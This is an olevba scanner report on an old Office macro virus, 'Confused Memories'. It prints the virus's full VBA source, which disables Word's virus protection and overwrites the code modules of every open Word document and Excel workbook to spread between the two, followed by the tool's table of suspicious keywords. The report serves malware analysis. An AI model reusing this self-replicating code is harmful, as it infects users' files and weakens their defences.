olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Confused.e-2195920edfa0f86ec6f9db62465139d9def35964
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Confused.e-2195920edfa0f86ec6f9db62465139d9def35964 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Confused.e-2195920edfa0f86ec6f9db62465139d9def35964 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Confused.e-2195920edfa0f86ec6f9db62465139d9def35964 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Confused.e-2195920edfa0f86ec6f9db62465139d9def35964 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Confused Memories
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Application.EnableCancelKey = 0
With ThisDocument.VBProject.VBComponents("ThisDocument").CodeModule
λ = .Lines(1, .CountOfLines + 1): End With
Err.Clear: Set υ = GetObject(, "Excel.Application").VBE.ActiveVBProject.VBComponents("ThisWorkbook").CodeModule
If Err.Number = 0 Then If Not υ.Find("~^^~", 0, 0, 0, 0) Then υ.DeleteLines 1, υ.CountOfLines: υ.AddFromString λ
For ι = 1 To Documents.Count
With Documents(ι).VBProject.VBComponents("ThisDocument").CodeModule
If Not .Find("~^^~", 0, 0, 0, 0) Then
.DeleteLines 1, .CountOfLines
.AddFromString λ
End If: End With: Next
End Sub
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableEvents = 1
Application.EnableCancelKey = 0
With ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
λ = .Lines(1, .CountOfLines + 1): End With
Err.Clear: Set υ = GetObject(, "Word.Application").VBE.ActiveVBProject.VBComponents("ThisDocument").CodeModule
If Err.Number = 0 Then If Not υ.Find("~^^~", 0, 0, 0, 0) Then υ.DeleteLines 1, υ.CountOfLines: υ.AddFromString λ
For ι = 1 To Workbooks.Count
With Workbooks(ι).VBProject.VBComponents("ThisWorkbook").CodeModule
If Not .Find("~^^~", 0, 0, 0, 0) Then
.DeleteLines 1, .CountOfLines
.AddFromString λ
End If: End With: Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

